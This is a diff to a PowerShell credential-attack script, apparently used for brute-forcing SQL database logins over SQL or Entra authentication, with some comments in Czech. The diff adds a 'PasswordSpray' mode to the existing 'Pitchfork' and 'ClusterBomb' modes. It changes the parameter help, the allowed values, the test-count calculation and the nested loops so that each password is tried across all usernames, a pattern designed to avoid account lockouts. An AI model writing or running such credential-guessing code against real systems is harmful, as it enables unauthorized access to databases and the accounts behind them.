@@ -22,7 +22,7 @@
     The file containing a list of passwords without headers, with each password on a new line.
 
 .PARAMETER AttackMode
-    The mode of the attack. "Pitchfork" is a classic brute force where each username is matched with the password on the same line. "ClusterBomb" combines every username with every password, sending many passwords for one account before moving to the next account.
+    The mode of the attack. "Pitchfork" is a classic brute force where each username is matched with the password on the same line. "ClusterBomb" combines every username with every password, sending many passwords for one account before moving to the next account. "PasswordSpray" tries one password for all users before moving to the next password.
 
 .PARAMETER ConnectionMode
     The type of connection string used depending on the allowed authentication method for the SQL database. The options are "EntraPasswordless", "SQL", "EntraPassword", or "EntraIntegrated".
@@ -46,7 +46,7 @@ param (
     [parameter(Mandatory)][string]$UsernamesFile,
     [parameter(Mandatory)][string]$PasswordsFile,
     [parameter(Mandatory)]
-    [ValidateSet("Pitchfork", "ClusterBomb")]
+    [ValidateSet("Pitchfork", "ClusterBomb", "PasswordSpray")]
     [string]$AttackMode,
     [parameter(Mandatory)]
     [ValidateSet("EntraPasswordless", "SQL", "EntraPassword", "EntraIntegrated")]
@@ -158,7 +158,11 @@ $usernames = @(Get-Content -Path $UsernamesFile)
 $passwords = @(Get-Content -Path $PasswordsFile)
 
 # Výpočet celkového počtu testů
-$totalTests = if ($AttackMode -eq "Pitchfork") { [math]::Min($usernames.Count, $passwords.Count) * $initialCatalogues.Count } else { $usernames.Count * $passwords.Count * $initialCatalogues.Count }
+$totalTests = switch ($AttackMode) {
+    "Pitchfork" { [math]::Min($usernames.Count, $passwords.Count) * $initialCatalogues.Count }
+    "ClusterBomb" { $usernames.Count * $passwords.Count * $initialCatalogues.Count }
+    "PasswordSpray" { $usernames.Count * $passwords.Count * $initialCatalogues.Count }
+}
 $currentTest = 0
 
 # Provádění útoku podle zvoleného režimu
@@ -179,6 +183,18 @@ switch ($AttackMode) {
         foreach ($InitialCatalogue in $initialCatalogues) {
             foreach ($username in $usernames) {
                 foreach ($password in $passwords) {
+                    $currentTest++
+                    if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
+                        break
+                    }
+                }
+            }
+        }
+    }
+    "PasswordSpray" {
+        foreach ($InitialCatalogue in $initialCatalogues) {
+            foreach ($password in $passwords) {
+                foreach ($username in $usernames) {
                     $currentTest++
                     if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
                         break
